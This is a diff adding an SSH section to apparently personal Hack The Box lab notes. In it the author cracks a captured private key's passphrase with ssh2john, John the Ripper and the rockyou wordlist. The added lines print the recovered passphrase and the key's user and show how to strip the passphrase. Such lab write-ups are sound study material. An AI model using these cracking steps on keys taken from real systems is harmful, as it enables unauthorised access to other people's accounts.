@@ -2,6 +2,37 @@
 
 ## SSH
 
+! Make the Key into a format that John can work with.
+python3 ssh2john.py id_rsa > key.john
+
+! Use John and Rockyou to crack the passphrase for the Priv Key.
+user1㉿kali)-[~/Documents/htb-facts]
+└─$ ls
+authorized_keys  hydra.restore  id_rsa  key.john
+
+
+john --wordlist=/usr/share/wordlists/rockyou.txt key.john
+Created directory: /home/user1/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 24 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+dragonballz      (id_rsa)     
+1g 0:00:06:18 DONE (2026-03-01 21:28) 0.002640g/s 8.448p/s 8.448c/s 8.448C/s grecia..imissu
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+! Use the Passphrase to see the user for the Priv Key:
+
+ssh-keygen -y -f id_rsa  
+Enter passphrase for "id_rsa": 
+ssh-rsa AAAAC3NzaC1lZDI1NTE5AAAAINJwPYi5omOtlRsWvcRWL6yzzZQ9bcZKN/9oo5qU2d89 trivia@facts.htb
+
+ssh-keygen -p -f ~/.ssh/id_rsa
+When prompted for the "new passphrase," just hit Enter twice to leave it blank.
+
 ### NMAP NSE Brute for SSH
 
 
